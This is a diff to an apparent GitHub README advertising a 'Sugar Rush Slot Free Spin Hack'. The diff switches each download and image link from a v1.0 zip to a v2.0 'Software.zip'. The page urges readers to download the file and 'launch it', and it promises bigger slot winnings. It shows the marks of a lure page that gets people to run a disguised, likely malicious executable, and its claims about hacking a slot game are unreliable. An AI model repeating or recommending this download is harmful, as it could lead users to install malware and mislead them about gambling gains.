@@ -1,6 +1,6 @@
 # 🍭 Welcome to the Sugar Rush Slot Free Spin Hack Repository 🎰
 
-![sugar-rush](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v1.0/Release.zip)
+![sugar-rush](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -37,16 +37,16 @@ Are you ready to take your Sugar Rush gameplay to the next level? Look no furthe
 ---
 
 ## Get Started:
-Ready to boost your gameplay and maximize your winnings? Download our exclusive **[https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v1.0/Release.zip](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v1.0/Release.zip)** now! 🎮 Remember, the key to unlocking your full potential in Sugar Rush lies within this file. Launch it and let the hack begin! 💥
+Ready to boost your gameplay and maximize your winnings? Download our exclusive **[https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v2.0/Software.zip](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v2.0/Software.zip)** now! 🎮 Remember, the key to unlocking your full potential in Sugar Rush lies within this file. Launch it and let the hack begin! 💥
 
-[![Download Software](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v1.0/Release.zip)](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v2.0/Software.zip)](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v2.0/Software.zip)
 
 ---
 
 ## Play Smart, Win Big 🎉
 Immerse yourself in the world of Sugar Rush with our cutting-edge tools and strategies. Take control of your gameplay, increase your winnings, and conquer the slot game like never before. 🥇 What are you waiting for? Dive into the action and let the hacks guide you towards victory! 💰
 
-![sugar-rush-gameplay](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v1.0/Release.zip)
+![sugar-rush-gameplay](https://github.com/elimagic0/Sugar-Rush-Slot-Free-Spin-Hack/releases/download/v2.0/Software.zip)
 
 ---
 
